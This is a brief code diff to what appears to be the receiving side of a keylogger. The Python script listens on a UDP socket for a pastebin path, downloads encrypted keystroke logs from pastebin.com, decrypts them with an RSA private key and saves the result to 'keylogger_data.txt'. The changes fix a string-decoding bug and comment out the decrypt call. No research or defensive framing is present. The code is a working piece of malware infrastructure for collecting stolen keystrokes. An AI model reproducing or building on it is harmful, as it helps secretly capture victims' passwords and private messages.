@@ -14,7 +14,7 @@ def decrypt(ciphertext):
     cipher2 = PKCS1_OAEP.new(pkey)
     result = cipher2.decrypt(data)
     outfile = open("./keylogger_data.txt", "w")  # save decryption to file
-    outfile.write(result.decode)
+    outfile.write(result.decode("utf-8"))
     print(result)  # print decryption
 
 
@@ -42,7 +42,7 @@ while True:
             msg, send_addr = sock.recvfrom(64)
             msg = "https://pastebin.com/"+msg
             encrypted_keylog = get(msg).text
-            decrypt(encrypted_keylog)
+            # decrypt(encrypted_keylog)
             exit()
     else:
         exit()
